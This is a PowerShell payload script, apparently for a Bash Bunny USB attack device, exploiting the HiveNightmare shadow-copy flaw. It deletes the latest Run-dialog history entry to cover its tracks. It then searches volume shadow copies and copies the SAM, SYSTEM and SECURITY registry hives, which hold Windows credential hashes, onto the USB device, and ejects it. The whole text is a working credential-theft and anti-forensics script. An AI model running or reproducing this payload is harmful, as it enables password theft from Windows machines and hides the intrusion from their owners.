#Remove latest run entry
$p = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"; $m = "MRUList"; $l=gpv $p $m; rp $p $l[0]; sp $p $m $l.Substring(1);

#Set variables and create loot folder
$bb = (gwmi win32_volume -f 'label=''BashBunny''').Name;
$loot = $bb+"loot\HiveNightmare\";
$usr = (whoami) -replace "\\","_";
New-Item -ItemType Directory -Force -Path $loot$usr;

$i = 0;
$found = $FALSE;
while($i -lt <#TR#>) {
    try {
        [System.IO.File]::Copy("\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy"+$i+"\Windows\System32\config\SAM",$loot+$usr+"\SAM");
        $found = $TRUE;
        break;
    } catch {$i++}
}
if($found){
    [System.IO.File]::Copy("\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy"+$i+"\Windows\System32\config\SYSTEM",$loot+$usr+"\SYSTEM");
    [System.IO.File]::Copy("\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy"+$i+"\Windows\System32\config\SECURITY",$loot+$usr+"\SECURITY");
}

#Let the Bash Bunny know we're done here & Eject.
New-Item -ItemType file $bb"DONE";
(New-Object -comObject Shell.Application).Namespace(17).ParseName($bb).InvokeVerb("Eject");